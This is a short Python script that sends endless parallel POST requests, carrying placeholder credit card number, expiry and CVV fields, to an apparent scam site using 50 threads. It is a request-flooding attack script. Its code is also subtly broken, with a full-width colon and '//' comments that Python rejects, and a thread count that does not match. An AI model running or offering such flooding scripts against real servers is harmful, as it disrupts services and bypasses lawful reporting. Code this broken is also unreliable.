import requests 
import threading 

url = 'https://luncky.scammer.org/'

data = {
    'cc_number'： 'XXXXXXXXXXXXXXXXXXXX', //card number
    'cc_expmonth': 'XXXX', //exp month
    'cc_expyear': 'XXXX', //exp year
    'cc_cvv': 'XXXX' //cvv
}

def do_request():
    while True:
        r = requests.post(url, data=data)
        print(r.text)

threads = []

for i in range(55):
    t = threading.Thread(target=do_request)
    t.daemon = True
    threads.append(t)

for i in range(50):
    threads[i].start()

for i in range(50):
    threads[i].join()
    
 